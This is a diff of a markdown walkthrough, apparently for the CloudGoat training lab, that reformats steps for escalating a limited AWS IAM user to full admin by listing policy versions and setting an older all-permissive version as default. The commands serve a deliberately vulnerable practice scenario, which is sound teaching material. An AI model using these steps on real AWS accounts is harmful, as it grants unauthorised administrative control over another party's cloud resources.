@@ -70,7 +70,7 @@ Now that the installation of the cloudgoat python module is complete, move on to
     
 
 ## iam_privesc_by_rollback
-This scenario starts with limited user credentials and escalates to admin privileges by rolling back an iam policy version.   **Scenario Goal: Acquire full admin privileges**  
+This scenario starts with limited user credentials and escalates to admin privileges by rolling back an iam policy version.   **Scenario Goal: Acquire Full Administrative Privileges**  
 1. Create scenario  
 `./cloudgoat.py create iam_privesc_by_rollback --profile goat`  
 2. Document all Outputs information  
@@ -89,14 +89,14 @@ e.g.
 5. Document the PolicyArn Value
 6. List the versions for the discovered user policy   
 `aws iam list-policy-versions --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --profile raynor`   
-7. Get information on the policy for all versions
+7. Get information on the policy for all versions    
 `aws iam get-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v1 --profile raynor`
-8. Document the policy version which contains __Allowed Actions: *__ and __Resource: *__  
-This demonstrates administrative privileges by allowed all actions to be performed on all resources
-9. Set the default policy version to the one containing admin privileges 
-aws iam set-default-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v3 --profile Raynor  
-10. Verify account authorization details are administrative
-`aws iam get-account-authorization-details --profile raynor`
+8. Document the policy version which contains __Allowed Actions: *__ and __Resource: *__   
+This demonstrates administrative privileges by allowed all actions to be performed on all resources     
+9. Set the default policy version to the one containing admin privileges  
+`aws iam set-default-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v3 --profile Raynor`     
+10. Verify account authorization details are administrative   
+`aws iam get-account-authorization-details --profile raynor`   
 This list will be a bit accessive as the account now has all possible privileges   
 **Goal Achieved**
 
